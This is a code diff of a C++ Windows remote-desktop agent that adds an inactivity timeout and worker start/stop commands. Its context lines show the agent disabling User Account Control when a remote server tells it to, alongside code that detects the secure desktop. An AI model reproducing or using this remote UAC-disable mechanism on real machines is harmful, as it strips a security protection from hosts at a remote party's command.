@@ -30,19 +30,6 @@ std::atomic<int> RDPAgent::g_screen_origin_y{0};
 std::mutex RDPAgent::g_clip_m;
 std::string RDPAgent::g_last_clip;
 
-// ============ TLS CONN ============
-struct TlsConn
-{
-    SOCKET sock = INVALID_SOCKET;
-    CredHandle cred = {};
-    CtxtHandle ctx = {};
-    bool cred_ok = false;
-    bool ctx_ok = false;
-    SecPkgContext_StreamSizes sizes = {};
-    std::vector<uint8_t> raw;
-    std::vector<uint8_t> plain;
-};
-
 // ============ RAW TCP ============
 bool RDPAgent::send_all_raw(SOCKET s, const char *p, int n)
 {
@@ -1134,6 +1121,15 @@ void RDPAgent::handle_control(const std::string &j)
     std::string type;
     if (!json_str(j, "type", type))
         return;
+
+    // Update activity timestamp for any input event
+    if (type == "mouse_move" || type == "mouse_down" || type == "mouse_up" ||
+        type == "mouse_wheel" || type == "text" || type == "key_down" ||
+        type == "key_up" || type == "clipboard")
+    {
+        runtime.last_activity_time = std::chrono::steady_clock::now();
+    }
+
     if (type == "mouse_move")
     {
         int x = 0, y = 0;
@@ -1172,7 +1168,6 @@ void RDPAgent::handle_control(const std::string &j)
     }
     else if (type == "command")
     {
-        // Handle system commands from server
         std::string cmd;
         if (json_str(j, "cmd", cmd))
         {
@@ -1181,13 +1176,19 @@ void RDPAgent::handle_control(const std::string &j)
             {
                 log("handle_control: Executing disable_uac() command from server");
                 if (disable_uac())
-                {
                     log("handle_control: UAC disabled successfully");
-                }
                 else
-                {
                     log("handle_control: WARNING - Failed to disable UAC");
-                }
+            }
+            else if (cmd == "start-rdp-worker")
+            {
+                // Worker уже запущен — игнорируем повторную команду
+                log("handle_control: start-rdp-worker ignored, already running");
+            }
+            else if (cmd == "stop-rdp-worker")
+            {
+                log("handle_control: stop-rdp-worker command received, stopping");
+                runtime.stop = true;
             }
         }
     }
@@ -1699,7 +1700,10 @@ RDPAgent::RDPAgent(const RDPConfig &cfg) : config(cfg)
     runtime.bitrate = config.bitrate;
     runtime.framerate = config.framerate;
     runtime.mjpeg_q = config.mjpeg_q;
-    log("RDPAgent created: agent_id=" + config.agent_id);
+    runtime.timeout_sec = config.timeout_sec;
+    runtime.last_activity_time = std::chrono::steady_clock::now();
+    log("RDPAgent created: agent_id=" + config.agent_id +
+        " timeout=" + std::to_string(config.timeout_sec));
 }
 
 RDPAgent::~RDPAgent() { stop(); }
@@ -1727,6 +1731,8 @@ void RDPAgent::start()
                          { resolution_watch_loop(); });
     threads.emplace_back([this]()
                          { clipboard_watch_loop(); });
+    threads.emplace_back([this]()
+                         { check_activity_loop(); });
     threads.emplace_back([this]()
                          {
         while (!runtime.stop) {
@@ -1763,6 +1769,35 @@ RDPAgent::Status RDPAgent::getStatus() const
     st.screen_h = g_screen_h.load();
     st.is_connected = (runtime.ctrl_conn != nullptr);
     return st;
+}
+
+bool RDPAgent::hasInactivityTimeout() const
+{
+    return inactivity_timeout_reached.load();
+}
+
+void RDPAgent::check_activity_loop()
+{
+    while (!runtime.stop)
+    {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+        if (runtime.stop)
+            break;
+        if (runtime.timeout_sec <= 0)
+            continue;
+        auto now = std::chrono::steady_clock::now();
+        auto idle = std::chrono::duration_cast<std::chrono::seconds>(
+                        now - runtime.last_activity_time)
+                        .count();
+        if (idle >= runtime.timeout_sec)
+        {
+            logf("Inactivity timeout: %llds idle (limit %ds)",
+                 (long long)idle, runtime.timeout_sec);
+            inactivity_timeout_reached = true;
+            runtime.stop = true;
+            break;
+        }
+    }
 }
 
 // ============ SECURE DESKTOP DETECTION ============
@@ -1822,7 +1857,8 @@ bool RDPAgent::is_consent_exe_running()
 
 // ============ USER-SESSION WORKER ENTRYPOINT ============
 int run_rdp_worker(const std::string &host, int port,
-                   const std::string &agent_id, bool verify_cert)
+                   const std::string &agent_id, bool verify_cert,
+                   int timeout_sec)
 {
     // Путь к ffmpeg рядом с собственным exe.
     char path[MAX_PATH] = {0};
@@ -1838,19 +1874,25 @@ int run_rdp_worker(const std::string &host, int port,
     cfg.agent_id = agent_id;
     cfg.verify_cert = verify_cert;
     cfg.ffmpeg_path = ffmpeg;
+    cfg.timeout_sec = timeout_sec;
 
-    logf("run_rdp_worker: host=%s port=%d id=%s ffmpeg=%s",
-         host.c_str(), port, agent_id.c_str(), ffmpeg.c_str());
+    logf("run_rdp_worker: host=%s port=%d id=%s ffmpeg=%s timeout=%d",
+         host.c_str(), port, agent_id.c_str(), ffmpeg.c_str(), timeout_sec);
 
     RDPAgent agent(cfg);
     agent.start();
 
-    // Блокируемся до завершения (родительский процесс сделает TerminateProcess).
-    while (agent.isRunning())
+    // Блокируемся до завершения (родительский процесс сделает TerminateProcess
+    // или сработает таймаут неактивности).
+    while (agent.isRunning() && !agent.hasInactivityTimeout())
     {
         std::this_thread::sleep_for(std::chrono::seconds(1));
     }
 
     agent.stop();
+
+    if (agent.hasInactivityTimeout())
+        log("RDP worker finished due to inactivity timeout");
+
     return 0;
 }
